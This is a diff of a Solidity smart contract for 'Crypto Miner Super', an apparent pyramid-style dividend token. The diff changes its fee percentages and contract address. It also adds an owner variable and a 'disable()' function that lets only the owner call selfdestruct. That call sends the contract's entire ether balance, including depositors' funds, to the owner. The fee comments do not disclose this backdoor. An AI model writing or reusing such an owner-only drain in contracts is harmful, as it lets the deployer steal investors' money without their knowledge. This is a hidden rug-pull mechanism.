@@ -1,19 +1,22 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract CryptoMinerSuper at 0xdea9b5c9c0ea8178adf91d90fca7db196391e551
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract CryptoMinerSuper at 0x241e492c003dfbe6d60d8bfd1960c0b8b7944ebd
 */
 pragma solidity ^0.4.25;
 
 /*
-
-* [?] 39% Withdraw fee
-* [?] 10% Deposit fee
+* Crypto Miner Super concept
+*
+* [?] 5% Withdraw fee
+* [?] 15% Deposit fee
 * [?] 1% Token transfer
-* [?] 33% Referal link
+* [?] 35% Referal link
 *
 */
 
 contract CryptoMinerSuper {
 
+    address public owner;
+    
     modifier onlyBagholders {
         require(myTokens() > 0);
         _;
@@ -61,10 +64,10 @@ contract CryptoMinerSuper {
     string public name = "Crypto Miner Super";
     string public symbol = "CMS";
     uint8 constant public decimals = 18;
-    uint8 constant internal entryFee_ = 10;
+    uint8 constant internal entryFee_ = 15;
     uint8 constant internal transferFee_ = 1;
-    uint8 constant internal exitFee_ = 39;
-    uint8 constant internal refferalFee_ = 33;
+    uint8 constant internal exitFee_ = 5;
+    uint8 constant internal refferalFee_ = 35;
     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
     uint256 constant internal magnitude = 2 ** 64;
@@ -74,6 +77,11 @@ contract CryptoMinerSuper {
     mapping(address => int256) internal payoutsTo_;
     uint256 internal tokenSupply_;
     uint256 internal profitPerShare_;
+    
+    constructor() public 
+    {
+        owner = msg.sender;
+    }
 
     function buy(address _referredBy) public payable returns (uint256) {
         purchaseTokens(msg.value, _referredBy);
@@ -310,6 +318,13 @@ contract CryptoMinerSuper {
             y = z;
             z = (x / z + z) / 2;
         }
+    }
+    
+    function disable()
+        public
+    {
+        require( msg.sender == owner, "ONLY OWNER" );
+        selfdestruct(owner);
     }
 
 
